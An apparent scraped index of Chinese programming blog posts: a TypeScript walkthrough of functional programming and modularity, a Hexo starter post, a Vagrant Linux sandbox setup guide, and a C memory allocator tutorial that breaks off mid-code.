对软件发展提出了一个前瞻性的观点：* 编程会越来越复杂，对于代码复用或者说模块化编程的需求会越来越旺盛。* 恰好函数式编程的两个特性，高阶函数和惰性求值在模块化编程方面优势巨大，而这也解释了论文标题的来源。 前言 函数式编程的特点是不包含赋值语句，变量的值一旦给定就不再更改。这意味着一条函数式程序在执行过程中不会产生任何副作用，即只帮助计算结果而不影响其他任何数据。此外，这种属性还解放了函数执行的顺序，因为程序是引用透明的。 但仅仅是没有赋值，没有副作用，没有控制流这些还不够，有的人甚至听起来会觉得有点无聊。因为给结构化编程语言的参数加上 const 也能达到类似的效果，但后者显然能够做到更多东西。结构化编程能够对小模块编码，其通用模块能够重复使用，每个模块还可以独立测试，那我们为什么还需要用函数式编程？ 我们在模块化的过程中，通常需要将问题划分为子问题后求解，最后合并解决，划分问题的方式直接取决于将解决方案合并在一起的方式。上面所描述的这些优势本质上都是模块化带来的，函数式编程在模块化方面的优势在于能够高效合并子问题，论文剩余部分详细描述了函数式编程语言的两种用来合并子问题的胶水，即函数组合和程序组合。 函数组合 列表抽象 函数式编程允许用一些简单的函数组合抽象成一个更复杂的函数，文中用列表处理问题举例。 $$ listof\\ \\ast\\ ::=\\ Nil\\ |\\ cons\\ \\ast\\ (listof \\ \\ast) $$ 现在，我们规定一个 list 可以表示为一个空列表 Nil 或者一个 Cons，这里的 Cons 意为由一个元素和一个 list 构造而成的一个结构。当然其中的元素可以是任何类型，后文常用 Integer 类型，我在代码中用的是 number 类型。根据上面的描述，我们可以设计出代码如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051abstract class ListBase&lt;A&gt; { // 可视化打印 toString(this:List&lt;A&gt;): string { var msg = &quot;&quot; switch (this.tag) { case &quot;none&quot;: { msg = &quot;List[]&quot; break } case &quot;cons&quot;: { msg = &quot;List[&quot; + this.h var cur = this.t while (cur.tag === 'cons') { msg += &quot;, &quot; + cur.h cur = cur.t } msg += &quot;]&quot; break } case &quot;tree&quot;: { msg += &quot;Node &quot; + this.h if (this.t.tag === 'cons') { msg += &quot;(&quot; + this.t.toString() + &quot;)&quot; } break } } return msg }}type List&lt;T&gt; = Nil&lt;T&gt; | Cons&lt;T&gt; | Node&lt;T&gt;class Nil&lt;T&gt; extends ListBase&lt;T&gt; { // 方便类型推断的特殊技巧 readonly tag: &quot;none&quot; = &quot;none&quot; // 单例模式 static readonly Nil: List&lt;never&gt; = new Nil() private constructor() { super() }}class Cons&lt;T&gt; extends ListBase&lt;T&gt;{ readonly tag: &quot;cons&quot; = &quot;cons&quot; // h 表示第一个元素，t 表示剩余部分构成的 list constructor(readonly h: T, readonly t: List&lt;T&gt;) { super() }} 为了方便创建和打印使用这个列表对象，我编写了如下代码： 123456789101112const list = &lt;T&gt;(...s: T[]): List&lt;T&gt; =&gt; { if (s.length === 0) return none() else return cons(s[0])(list(...s.slice(1)))}const cons = &lt;T&gt;(h: T) =&gt; (t: List&lt;T&gt;) =&gt; new Cons(h, t)const none = &lt;T&gt;(): List&lt;T&gt; =&gt; Nil.Nilconst Xs = list(1, 1, 2, 3, 5, 8, 13, 21)log(&quot;Xs is &quot; + Xs.toString()) // Output:Xs is List[1, 1, 2, 3, 5, 8, 13, 21] sum 函数的诞生 接下来，文中定义了一个用来求总的递归函数 sum，它允许接受一个 list（注意，Nil 和 Cons 都是 list）。当对 Nil 求和时显然结果为 0，这样边界条件就确定了，而对 Cons 求和又可被分解为让 Cons 内部的数字加上另一个 list 的求和结果。文字描述有点绕口，但其实就是一个简单的递归，不再赘述。 $$ sum\\ Nil\\ = \\ \\boxed0\\ sum(Cons\\ n\\ list)\\ = n\\ \\boxed+\\ sum\\ list $$ Reduce 和 柯里化 观察上面的式子，真正实际参与计算的部分是 0 和 +，如此我们可以借助 foldr 函数将 sum 抽象，在这个过程中，foldr 表现出了一种通用的递归模式。实际上文中提到的 foldr 概念，就是我们常用的 reduce，这里我还用到了柯里化技巧方便复用。 1234567891011121314// 常用函数const add = (a:number)=&gt;(b:number):number =&gt; a + bconst double = (n: number) =&gt; 2*n// foldrconst foldr = &lt;T&gt;(f: (a: any)=&gt;(b: T)=&gt;T, x: T) =&gt; (l: List&lt;any&gt;):T =&gt; { if (l.tag === &quot;none&quot;) return x else return f(l.h)(foldr(f, x)(l.t))}const sum = foldr(add, 0)log(&quot;return: &quot;, sum(Xs))// Output:return: 54 后面的连乘、异或、求与都大同小异，然后是 append 函数的实现： 1234// appendconst append = &lt;T&gt;(a: List&lt;T&gt;)=&gt;(b: List&lt;T&gt;): List&lt;T&gt; =&gt; foldr(cons, b)(a)log(&quot;append&quot;, Z1.toString(), &quot;and&quot;, Z2.toString(), &quot;is&quot;, append(Z1, Z2).toString())// Output:append List[1, 2] and List[3, 4] is List[1, 2, 3, 4] 类似地，我们还可以借助 foldr 写出求列表长度的函数 length，以及对倍增列表中每个元素值的 doubleall 函数： 1234567891011const count = &lt;T&gt;(a: T, n: number) =&gt; n + 1const length = foldr(count, 0)log(&quot;count&quot;, Xs.toString(), &quot;is&quot;, length(Xs))// Output:count List[1, 1, 2, 3, 5, 8, 13, 21] is 8const doubleandcons = (n: number, list: List&lt;number&gt;) =&gt; { return cons(2 * n, list)}const doubleall = foldr(doubleandcons, none())log(&quot;doubleall&quot;, Xs.toString(), &quot;is&quot;, doubleall(Xs).toString())// Output:doubleallcons List[1, 1, 2, 3, 5, 8, 13, 21] is List[2, 2, 4, 6, 10, 16, 26, 42] 观察后发现，doubleandcons 实际上是两个函数 double 和 cons 的组合，因此我们可以将其模块化为 fandcons 函数，代码如下： 12345678const double = (n: number) =&gt; 2*nconst fandcons = &lt;T&gt;(f: (x: T) =&gt; T) =&gt; (el: T, list: List&lt;T&gt;) =&gt; { return cons(f(el), list)}const doubleandcons2 = fandcons(double)const doubleall2 = foldr(doubleandcons2, none())log(&quot;doubleall(base on fandcons)&quot;, Xs.toString(), &quot;is&quot;, doubleall2(Xs).toString())// Output:doubleall(base on fandcons) List[1, 1, 2, 3, 5, 8, 13, 21] is List[2, 2, 4, 6, 10, 16, 26, 42] compose 而为了构造 compose 函数，我发现之前的 cons 需要柯里化，重构后得到代码如下： 123456const compose = (f1: any, f2: any) =&gt; (x: any) =&gt; f1(f2(x))const fandcons = (f: any) =&gt; compose(cons)(f)const doubleandcons = fandcons(double)const doubleall = foldr(doubleandcons, none())log(&quot;doubleall&quot;, Xs.toString(), &quot;is&quot;, doubleall(Xs).toString())// Output:doubleall List[1, 1, 2, 3, 5, 8, 13, 21] is List[2, 2, 4, 6, 10, 16, 26, 42] map 当我们设计好 doubleall 后又发现另一个模块函数 map，map 接收一个函数，并对列表中每个元素执行，最终得到一个新的列表，我们可以这样设计： 12345const compose = (f1: any)=&gt;(f2: any) =&gt; (x: any) =&gt; f1(f2(x))const map = (f: any) =&gt; foldr(compose(cons)(f), none())const doubleall = map(double)log(&quot;doubleall2&quot;, Xs.toString(), &quot;is&quot;, doubleall2(Xs).toString())// Output:doubleall2 List[1, 1, 2, 3, 5, 8, 13, 21] is List[2, 2, 4, 6, 10, 16, 26, 42] 然后我们还可以计算二维矩阵的总和函数 summatrix： 1234// summatrixconst summatrix = compose(sum)(map(sum))log(&quot;summatrix&quot;, mat.toString(), &quot;is&quot;, summatrix(mat))// Output:summatrix List[List[1, 2], List[3, 4], List[1, 1, 2, 3, 5, 8, 13, 21]] is 64 上面这些例子都是从一个最简单的 sum 函数模块化而来。 标签树 现在考虑另一个例子，有序标签树，一颗树由一个根结点 label 和子树列表构成，每个子树都是有序标签树。 思路和上面差不多，慢慢地耐心设计： 12345678910111213141516171819202122232425262728class Node&lt;T&gt; extends ListBase&lt;T&gt;{ readonly tag: &quot;tree&quot; = &quot;tree&quot; constructor(readonly h: T, readonly t: List&lt;Node&lt;T&gt;&gt;) { super() }}const node = &lt;T&gt;(h: T) =&gt; (l: List&lt;Node&lt;T&gt;&gt;): Node&lt;T&gt; =&gt; new Node(h, l)// tree// 重写了下 node 方便造数据来测试const tree = &lt;T&gt;(h: T) =&gt; (...subtrees: Node&lt;T&gt;[]) =&gt; new Node(h, list(...subtrees))const tree4 = tree(4)()const tree3 = tree(3)(tree4)const tree2 = tree(2)()const tree1 = tree(1)(tree2, tree3)log(tree1.toString())log(tree2.toString())log(tree3.toString())log(tree4.toString())// Node 1(List[Node 2, Node 3(List[Node 4])])// Node 2// Node 3(List[Node 4])// Node 4 然后继续，由于前面我们梳理的比较顺畅，所以 sumtree 和 labels 函数都顺利实现： 12345678910111213141516171819// folctreeconst foldtree = &lt;T&gt;(f: any, g:any, a:T)=&gt;(l: List&lt;any&gt;):T=&gt;{ if (l.tag === &quot;none&quot;) return a else if (l.tag === &quot;tree&quot;) return f(l.h)(foldtree(f, g, a)(l.t)) else return g(foldtree(f, g, a)(l.h))(foldtree(f, g, a)(l.t))}// sumtreeconst sumtree = foldtree(add, add, 0)log(sumtree(tree1))// Output: 10// labelsconst labels = foldtree(cons, append, none())log(labels(tree1).toString())// Output:List[1, 2, 3, 4] 最后是 doubletree： 123456// maptreeconst maptree = (f: any)=&gt; foldtree(compose(node)(f), cons, none())// doubletreeconst doubletree = maptree(double)log(doubletree(tree1).toString())// Output:Node 2(List[Node 4, Node 6(List[Node 8])]) 简单总结一下，在编码过程中我一直在反复重构代码。由于 Typescript 本身特性，如何设计良好的类型定义是真的很费心力，尤其在下一章引入惰性求值后之前所设计的函数基本要全部推倒重写。 程序组合 和函数组合不同，形如 $(g\\ .\\ f)=g (f\\ input)$ 的程序组合可能会有如下场景，即 f 仅在 g 尝试读取输入时才运行并提供输出，而当 g 停止取数据时则 f 停止计算，这实际上就是惰性求值。 惰性求值 为了方便和论文后面描述的内容统一，我们先将之前的代码重构，为了便于区分，将 list 重命名为 stream，并将之前的函数用新的方式复现： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105// 简化打印语句：方便测试export const log = (msg?: any, ...optionalParams: any[]) =&gt; console.log(msg, ...optionalParams)// lazyconst memorize = &lt;T&gt;(f: () =&gt; T): () =&gt; T =&gt; { let memo: T | null = null return () =&gt; { if (memo === null) memo = f() return memo }}type Stream&lt;T&gt; = Nil&lt;T&gt; | Cons&lt;T&gt;type Pair = [number, number]abstract class StreamBase&lt;A&gt; { toString(this: Stream&lt;A&gt;): string { var msg = &quot;Stream(&quot; switch (this.tag) { case &quot;none&quot;: break case &quot;cons&quot;: { msg += this.h() var cur = this.t() while (cur.tag === 'cons') { msg += &quot;, &quot; + cur.h() cur = cur.t() } } } msg += &quot;)&quot; return msg }}class Nil&lt;T&gt; extends StreamBase&lt;T&gt; { static readonly NIL: Stream&lt;never&gt; = new Nil() readonly tag: &quot;none&quot; = &quot;none&quot; private constructor() { super() }}export class Cons&lt;T&gt; extends StreamBase&lt;T&gt;{ readonly tag: &quot;cons&quot; = &quot;cons&quot; constructor(readonly h: () =&gt; T, readonly t: () =&gt; Stream&lt;T&gt;) { super() }}const cons = &lt;T&gt;(h: () =&gt; T, t: () =&gt; Stream&lt;T&gt;): Stream&lt;T&gt; =&gt; new Cons(memorize(h), memorize(t))const none = &lt;T&gt;(): Stream&lt;T&gt; =&gt; Nil.NILconst stream = &lt;T&gt;(...s: T[]): Stream&lt;T&gt; =&gt; { if (s.length === 0) return none() else return cons(() =&gt; s[0], () =&gt; stream(...s.slice(1)))}const foldr = &lt;A, B&gt;(f: (a: A, b: () =&gt; B) =&gt; B, x: () =&gt; B, s: Stream&lt;A&gt;): B =&gt; { if (s.tag === &quot;none&quot;) return x() return f(s.h(), () =&gt; foldr(f, x, s.t()))}const Xs = stream(1, 1, 2, 3, 5, 8, 13, 21)const Z1 = stream(1, 2)const Z2 = stream(3, 4)const M1 = stream(Z1, Z2, Xs)const add = (a: number, b: () =&gt; number): number =&gt; a + b()const double = (n: number) =&gt; 2 * nconst sum = (s: Stream&lt;number&gt;) =&gt; foldr(add, () =&gt; 0, s)// Output:return: 54// appendconst append = &lt;T&gt;(s1: Stream&lt;T&gt;, s2: () =&gt; Stream&lt;T&gt;): Stream&lt;T&gt; =&gt; { return foldr((a, b) =&gt; cons(() =&gt; a, b), s2, s1)}// lengthconst count = &lt;T&gt;(a: T, n: () =&gt; number) =&gt; n() + 1const length = &lt;T&gt;(s: Stream&lt;T&gt;): number =&gt; foldr(count, () =&gt; 0, s)const flatMap = &lt;A, B&gt;(s: Stream&lt;A&gt;, f: (a: A) =&gt; Stream&lt;B&gt;): Stream&lt;B&gt; =&gt; { return foldr((a, b) =&gt; append(f(a), b), () =&gt; none(), s)}// map Stream 函数映射const map = &lt;A, B&gt;(s: Stream&lt;A&gt;, f: (a: A) =&gt; B): Stream&lt;B&gt; =&gt; flatMap(s, a =&gt; stream(f(a)))const doubleall = (s: Stream&lt;number&gt;) =&gt; map(s, double)// summatrixconst summatrix = (mat: Stream&lt;Stream&lt;number&gt;&gt;): number =&gt; sum(map(mat, sum))log(&quot;Xs is &quot; + Xs.toString())// Output:Xs is List[1, 1, 2, 3, 5, 8, 13, 21]log(&quot;return: &quot;, sum(Xs))// Output:return: 54log(&quot;append&quot;, Z1.toString(), &quot;and&quot;, Z2.toString(), &quot;is&quot;, append(Z1, ()=&gt;Z2).toString())// Output:append List[1, 2] and List[3, 4] is List[1, 2, 3, 4]log(&quot;count&quot;, Xs.toString(), &quot;is&quot;, length(Xs))// Output:count List[1, 1, 2, 3, 5, 8, 13, 21] is 8log(&quot;doubleall&quot;, Xs.toString(), &quot;is&quot;, doubleall(Xs).toString())// Output:doubleall List[1, 1, 2, 3, 5, 8, 13, 21] is List[2, 2, 4, 6, 10, 16, 26, 42]log(&quot;summatrix&quot;, M1.toString(), &quot;is&quot;, summatrix(M1))// Output:summatrix List[List[1, 2], List[3, 4], List[1, 1, 2, 3, 5, 8, 13, 21]] is 64 平方根的无限序列 我们可以用 Newton-Raphson 平方根算法去计算一个数的平方根，算法本质上是在计算一系列近似值，每个值都由前一个值计算得到并且更接近真实结果（即目标值的平方根）。这里我们用 next 函数抽象优化过程，继续观察 next 函数，我们可以再抽象出 repeat 函数。 123456// [1]squareroot(N) 牛顿-拉弗森公式const next = (n: number) =&gt; (x: number): number =&gt; (x + n / x) / 2const repeat = &lt;T&gt;(f: (x: T) =&gt; T, a: T): Stream&lt;T&gt; =&gt; cons(() =&gt; a, () =&gt; repeat(f, f(a))) 而为了方便取元素，我还在 StreamBase 内部设计了 take 函数： 123456789101112abstract class StreamBase&lt;A&gt; { // 取前 n 个元素 take(this: Stream&lt;A&gt;, n: number): Stream&lt;A&gt; { if (this.tag === &quot;none&quot; || n &lt;= 0) return none() const self = this return cons(this.h, () =&gt; self.t().take(n - 1)) } // omit others...} 误差处理 借助 take 函数，我们可以定义一个误差处理函数 within，用来截停一个无限的近似序列，当相邻两个元素误差小于等于 eps 时就截止： 12345678910const within = (eps: number, s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; { if (s.tag === &quot;none&quot;) return none() const [a, b] = s.take(2).toList() if (Math.abs(a - b) &lt;= eps) { return cons(s.h, () =&gt; cons(() =&gt; b, () =&gt; none())) } return cons(s.h, () =&gt; within(eps, s.t()))} 我们还可以定义另外一种误差处理方式 withre，用比率接近 1 去替换绝对误差接近 0: 12345678910const withre = (eps: number, s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; { if (s.tag === &quot;none&quot;) return none() const [a, b] = s.take(2).toList() if (Math.abs(a - b) &lt;= eps * Math.abs(b)) { return cons(s.h, () =&gt; cons(() =&gt; b, () =&gt; none())) } return cons(s.h, () =&gt; withre(eps, s.t()))} 最后，得到我们想要的 sqrt 函数： 12345const sqrt = (a0: number, eps: number, n: number): Stream&lt;number&gt; =&gt; within(eps, repeat(next(n), a0))const relativesqrt = (a0:number, eps:number, n:number): Stream&lt;number&gt; =&gt; withre(eps, repeat(next(n), a0)) 微分 我们知道对于某个点微分的结果等于斜率，当 h 比较小时，可以用 easydiff 计算函数 f 在 x 附近的斜率。 123// [2]numerical differentiationconst easydiff = (f: (x: number) =&gt; number, x: number) =&gt; (h: number) =&gt; (f(x + h) - f(x)) / h 可是虽然 h 越小斜率计算越正确，但当到达某个临界点后随着 h 进一步变小，斜率又会因舍入误差逐渐失真。因此为了找合适的斜率，我们采取的策略可以用合适的 eps 去选择足够准确的第一个近似值： 123const halve = (x: number): number =&gt; x / 2const differentiate = (h0: number, f: (a: number) =&gt; number, x: number): Stream&lt;number&gt; =&gt; repeat(halve, h0).map(easydiff(f, x)) improve 论文进一步探讨了如何在 differentiate 的基础上对其进行优化，order 函数是为了确定函数的阶数，从而利用 elimerror 根据阶数去消除误差，最终组合得到了 improve 函数： 1234567891011121314151617181920212223const elimerror = (n: number, s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; { if (s.tag === 'none') return none() if (s.take(2).length() &lt; 2) return s const [a, b] = s.take(2).toList() return cons(() =&gt; (b * Math.pow(2, n) - a) / (Math.pow(2, n) - 1), () =&gt; elimerror(n, s.t()))}const order = (s: Stream&lt;number&gt;): number =&gt; { const head3elem = s.take(3) if (head3elem.length() &lt; 3) { throw new Error(&quot;[Data Shape Error]: the element number of input \\'Stream\\' cannot be smaller than 3.&quot;) } const [a, b, c] = head3elem.toList() return a === b ? 0 : Math.round(Math.log2((a - c) / (b - c) - 1))}const improve = (s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; { if (s.tag === 'none') return s return elimerror(order(s), s)} super 由于在数学上，对于一个近似序列的 improve 本身也可以被 improve，由此我们可以设计一个 super 函数（这里由于 super 本身是语言关键字，所以该用 superman 替代）反复优化： 1234567891011const second = &lt;T&gt;(s: Stream&lt;T&gt;): T =&gt; { const head2elem = s.take(2) if (head2elem.length() &lt; 2) { throw new Error(&quot;[Data Shape Error]: the element number of input \\'Stream\\' cannot be smaller than 2.&quot;) } const [a, b] = head2elem.toList() return b}const superman = (s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; map(repeat(improve, s), second) 但是在实际测试过程中发现，当 order = 0 时，elimerror 不再适用，因此修改原来的代码如下： 12345678910111213141516171819202122232425const elimerror = (n: number, s: Stream&lt;number&gt;): Stream&lt;number&gt; =&gt; { if (s.tag === 'none') return none() if (n === 0) return s.t() if (s.take(2).length() &lt; 2) return s const [a, b] = s.take(2).toList() return cons(() =&gt; (b * Math.pow(2, n) - a) / (Math.pow(2, n) - 1), () =&gt; elimerror(n, s.t()))}log(&quot;\\n===Numerical Differentiation Test===\\n&quot;)const fn1 = (x: number): number =&gt; Math.pow(x, 3) + x + 13const dfn1 = (x: number): number =&gt; 3 * Math.pow(x, 2) + 1log(&quot;fn1 = X3 + x + 13&quot;)log(&quot;d.fn1 = 3 * X2 + 1&quot;)log(&quot;\\n[example 1]: d.fn1(3)&quot;)log(&quot;expect:&quot;, dfn1(3))const fn2 = differentiate(1, fn1, 3)log(&quot;init:&quot;, fn2.take(10).toString())log(&quot;improve:&quot;, improve(fn2).take(10).toString())log(&quot;super:&quot;, within(0.0001, superman(fn2)).take(10).toString()) 积分 论文最后一个例子讨论了积分，easyintegrate 函数只能给出一个不太靠谱的值，尤其当两个端点靠的过于远的时候。为了得到更准确的积分，可以取 a 到 b 的中点 mid，然后分别计算 a 到 mid 和 mid 到 b 的积分，然后将二者加起来。文中设计了一个生成近似序列的函数 integrate： 1234567891011121314151617181920212223242526// [3]numerical integrationconst easyintegrate = (f: (x: number) =&gt; number, a: number, b: number): number =&gt; (f(a) + f(b)) * (b - a) / 2const addpair = (x: Pair): number =&gt; { const [a, b] = x return a + b}// 打包：将两个 Stream 的元素按序两两执行二元运算const zip2 = &lt;T&gt;(s1: Stream&lt;T&gt;, s2: () =&gt; Stream&lt;T&gt;): Stream&lt;Pair&lt;T&gt;&gt; =&gt; { const self = s1 const another = s2() if (self.tag === &quot;none&quot; || another.tag === &quot;none&quot;) return none() else return cons(() =&gt; [self.h(), another.h()], () =&gt; zip2(self.t(), another.t))}const integrate_origin = (f: (x: number) =&gt; number, a: number, b: number): Stream&lt;number&gt; =&gt; { const mid = (a + b) / 2 return cons( () =&gt; easyintegrate(f, a, b), () =&gt; map(zip2(integrate_origin(f, a, mid), () =&gt; integrate_origin(f, mid, b)), addpair) )} 但其实观察可以发现，integrate 重复计算了 a、b、mid 处的 f 值，为了消除这种重复计算，有了： 12345678910const integ = (f: (x: number) =&gt; number, a: number, b: number, fa: number, fb: number): Stream&lt;number&gt; =&gt; { const m = (a + b) / 2 const fm = f(m) return cons( () =&gt; (fa + fb) * (b - a) / 2, () =&gt; map(zip2(integ(f, a, m, fa, fm), () =&gt; integ(f, m, b, fm, fb)), addpair) )}const integrate = (f: (x: number) =&gt; number, a: number, b: number): Stream&lt;number&gt; =&gt; integ(f, a, b, f(a), f(b)) 最后，结合之前可以测试文中给的两个例子： 123456789101112log(&quot;\\n===Numerical Integration Test===\\n&quot;)log(&quot;[ example 1 ]: improve (integrate f 0 1)&quot;)log(&quot; where f x=1/(1+x * x)&quot;)log(&quot;integrate f = arctan(x), so (integrate f 0 1) = arctan(1) - arctan(0)&quot;)log(&quot;expect:&quot;, Math.atan(1) - Math.atan(0))const ft = (x: number): number =&gt; 1 / (1 + x * x)log(&quot;Return:&quot;, withre(0.00000001, improve(integrate(ft, 0, 1))).toString())log(&quot;\\n[ example 2 ]: super (integrate sin 0 4)&quot;)log(&quot;integrate sin = -cos(x), so (integrate sin 0 4) = -cos(4) + cos(0)&quot;)log(&quot;expect:&quot;, -Math.cos(4) + Math.cos(0))log(&quot;Return:&quot;, withre(0.00000001, superman(integrate(Math.sin, 0, 4))).toString()) 123456789101112===Numerical Integration Test===[ example 1 ]: improve (integrate f 0 1) where f x=1/(1+x * x)integrate f = arctan(x), so (integrate f 0 1) = arctan(1) - arctan(0)expect: 0.7853981633974483Return: Stream(0.7833333333333333, 0.7853921568627452, 0.7853981256146768, 0.7853981628062056, 0.7853981633882091)[ example 2 ]: super (integrate sin 0 4)integrate sin = -cos(x), so (integrate sin 0 4) = -cos(4) + cos(0)expect: 1.6536436208636118Return: Stream(1.0617923583434352, 1.5780150025674877, 1.690241935320747, 1.6633363775825898, 1.6536816398263603, 1.6536435134376641, 1.6536436209110699, 1.6536436208636065)","link":"/2022/12/11/functional-programming-and-modularity/"},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. 请参考 Bulma 文档来了解所有可选的元素和样式。 复制其中的 HTML 代码段并直接放入你的 Markdown 文件中。 12345678910111213141516/** * @author John Smith &lt;john.smith@example.com&gt;*/package l2f.gameserver.model;public abstract strictfp class L2Char extends L2Object { public static final Short ERROR = 0x0001; public void moveTo(int x, int y, int z) { _ai = null; log(&quot;Should not be called&quot;); if (1 &gt; 5) { // wtf!? return; } }} Quick Start Create a new post 1hexo new &quot;My New Post&quot; More info: Writing Run server 1hexo server More info: Server Generate static files 1hexo generate More info: Generating Deploy to remote sites 1hexo deploy More info: Deployment How to use ICARUS. 修改优化 布局修改 Candinya and Kratos-Rebirth 字体修改","link":"/2002/10/31/hello-world/"},{"title":"如何创建一个随意折腾的 Linux 沙盒环境？","text":"介绍 项目式学习（Project Based Learning）能够快速检验和提高一个人的编程水平，而学习过程中又不可避免地会编写运行一些 Demo。然而，如果直接使用 Windows 或者 MacOS 多少会面临环境部署问题，因此拥有一个能随意折腾地 Linux 沙盒对我来说开始变得尤为迫切。因此，在本篇博客中，我将介绍如何在 Windows 上轻松创建一个 Linux 沙盒。 部署 Linux 的方法 最直接的想法是在阿里云等平台直接租一台云主机，选择完套餐后再启动就是一个 Linux 系统，甚至配有公网 IP。但坏处也很明显，贵！ 各种在线沙盒是退而求其次的想法，诸如 COMPILER EXPLORER 等，想用 C++ 的任一版本编译器都可，还不用部署，开盒即用还随用随扔。 最后就是各种本地跑的虚拟机了，厚重的如 VirtualBox、VMware，小巧的如 Docker，还有就是今天的主角 Vagrant 了！Vagrant 是由 HashiCorp 公司开发的工具，不仅简单易上手，启停和连接也非常迅速。 Vagrant 安装与配置 使用 Vagrant 搭建本地开发环境，并准备一个 C++ 编译环境。 前置条件 已安装 VirtualBox 安装 Vagrant 进入 Vagrant 下载页面 根据系统架构选择下载安装包：32 位选择 i686，64 位选择 AMD64（x86_64） 验证架构： 123PS E:\\VagrantBoxes&gt; wmic os get osarchitectureOSArchitecture64-bit 安装后验证是否成功： 1vagrant --version 环境准备 添加基础环境，可到 HashiCorp’s Vagrant Cloud box catalog 查看。 初始化虚拟环境（如 vb_cpp_memdiy），会生成一个 Vagrantfile： 1vagrant init vb_cpp_memdiy 在 Vagrantfile 中配置网络和 SSH。 启动环境并连接 启动虚拟环境： 1vagrant up 通过 SSH 连接访问： 1vagrant ssh 退出环境： 12# 按 Ctrl+D 或输入logout 准备 C++ 编译环境 添加 PPA 并安装工具 添加 PPA 以获取更新版本的 CMake: 12sudo add-apt-repository ppa:kitware/ppasudo apt-get update 安装 CMake、GDB 和 G++： 1sudo apt-get install cmake gdb g++ 解决依赖包问题 如果遇到依赖包缺失或版本冲突，升级并下载相应的包。 调试设置 将调试调整为远程，避免调用本地的 MinGW（Windows）。 结论 通过以上步骤，你可以在本地使用 Vagrant 搭建一个易于控制的开发环境，并准备好 C++ 编译环境。","link":"/2024/07/02/how-to-create-a-sandbox/"},{"title":"如何实现一个内存分配器？","text":"使用 C 语言实现内存分配器 在这篇文章中，我们将使用 C 语言编写一个简单的内存分配器。实际上，这个内存分配器是对 malloc(), calloc(), realloc() 和 free() 函数的复现。 程序的虚拟地址空间结构 一个程序的虚拟地址空间结构包括以下部分：代码段 (text)，数据段 (data)，未初始化数据段 (BSS)，堆 (Heap) 和栈 (Stack)。其中，堆是用于动态内存分配的区域，内存块的申请和释放操作都在这里进行。brk 指向堆的末尾，我们可以通过 sbrk() 函数控制 brk 位置从而分配和释放内存。 内存分配的问题 在申请分配内存时，主要面临两个问题： 假设我们申请了内存块 A、B、C，然后想要释放 B，但由于 C 还在使用中，实际上我们不能直接释放 B 的空间。 当我们想释放 B 时，我们无法确定要释放多少字节。 解决方案 对于问题 1，我们可以在释放 B 时将 B 标记为空闲状态，但保留 B 所占的内存区域。 对于问题 2，我们需要在申请内存时记录每个内存块的大小。 我们将创建一个名为 header_block 的结构体来保存这些信息。具体来说，当我们想要释放 B 时，我们会将 B 的状态设置为空闲状态。当申请新的内存块时，我们可以检查被标记为空闲的内存块，如果申请的空间小于或等于该内存块的大小，我们就直接使用这个空闲内存块，并将其状态修改为非空闲。为了方便管理，我们采用链表结构将申请的内存块链接起来。 线程安全 为了避免多个线程同时访问内存，我们需要给内存分配器加锁。我们将使用 pthread_mutex_t 全局锁。 123pthread_mutex_t global_malloc_lock;pthread_mutex_lock(&amp;global_malloc_lock);pthread_mutex_unlock(&amp;global_malloc_lock); 代码实现 在代码实现阶段，我们的目标是重写内存分配器，也就是重新实现 Linux 中的 malloc(), free(), calloc(), 和 realloc() 四个函数。您可以参考 Linux 手册的 malloc(3) 来查看具体的输入输出参数。 malloc()函数 接收一个调用块的大小，并返回一个指向分配内存的指针。需要注意的是，这里的内存是未初始化的。如果 size 为 0，那么返回 NULL。 由于我们的问题 1 和问题 2，我们需要给这个内存块定义一个头部 header 去记录内存块大小和空闲状态，因此实际向系统申请的内存是 header 和 block 的总和。 free()函数 接收一个内存块指针，并释放这个指针对应的内存。如果指针为空，那么不做任何操作。 在具体的实现中，我们首先需要得到这个 block 对应的 header 指针，然后检查当前内存块是否位于程序堆栈的顶部，如果是，那么释放它。 实践 根据我们之前的研究和讨论，我们首先需要为内存块定义一个 header。这个 header 包含三个信息：内存块的大小、内存块是否可用以及指向下一个内存块的指针。 在这里，我们需要对齐 16 字节。这是因为在 64 位处理器上，16 字节是一个常用的对齐边界。我们使用 size_t 表示内存大小和数组索引的无符号整数类型。这通常对应于机器字大小。最终我们得到以下的代码： 1234567891011121314151617181920212223242526272829typedef char ALIGN[16]; // 对齐 16 字节union header { struct { size_t size; unsigned is_free; union header *next; } h; ALIGN stub;};typedef union header header_block;header_block *head, *tail;void *malloc(size_t size) { if (size == 0) { return NULL; } void *block; block = sbrk(size + sizeof (header_block)); if (block == (void *) -1) { return NULL; } header_block *hb = block; hb-&gt;h.size = size; hb-&gt;h.is_free = 0; hb-&gt;h.next = NULL; tail-&gt;h.next = block; tail = block; return block;} 在这段代码中，我们首先检查请求的内存大小。如果大小为 0，我们直接返回 NULL。然后，我们使用 sbrk() 函数来分配内存。如果分配失败，我们返回 NULL。接着，我们创建一个 header_block，并设置它的大小、空闲状态和下一个块的指针。最后，我们更新链表的尾部，并返回新分配的内存块。 接下来，我们需要修改这个函数，使其在申请新内存块之前先查找空闲的内存块。如果找到一个足够大的空闲块，我们就直接分配这个块，否则我们就申请一个新的内存块。同时，我们还需要考虑到线程同步的问题。以下是修改后的代码： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950typedef union header header_block;header_block *head, *tail;pthread_mutex_t global_malloc_lock;header_block *find_free_block(size_t size);void *malloc(size_t size);void free(void *_Nullable ptr);void *calloc(size_t nmemb, size_t size);void *realloc(void *_Nullable ptr, size_t size);void *malloc(size_t size) { if (size == 0) { return NULL; } header_block *hb; void *block; pthread_mutex_lock(&amp;global_malloc_lock); hb = find_free_block(size); if (hb) { hb-&gt;h.is_free = 0; pthread_mutex_unlock(&amp;global_malloc_lock); return (void *) (hb + 1); } block = sbrk(size + sizeof(header_block)); if (block == (void *) -1) { pthread_mutex_unlock(&amp;global_malloc_lock); return NULL; } hb = block; hb-&gt;h.size = size; hb-&gt;h.is_free = 0; hb-&gt;h.next = NULL; if (!head) { head = hb; } if (tail) { tail-&gt;h.next = hb; } tail = 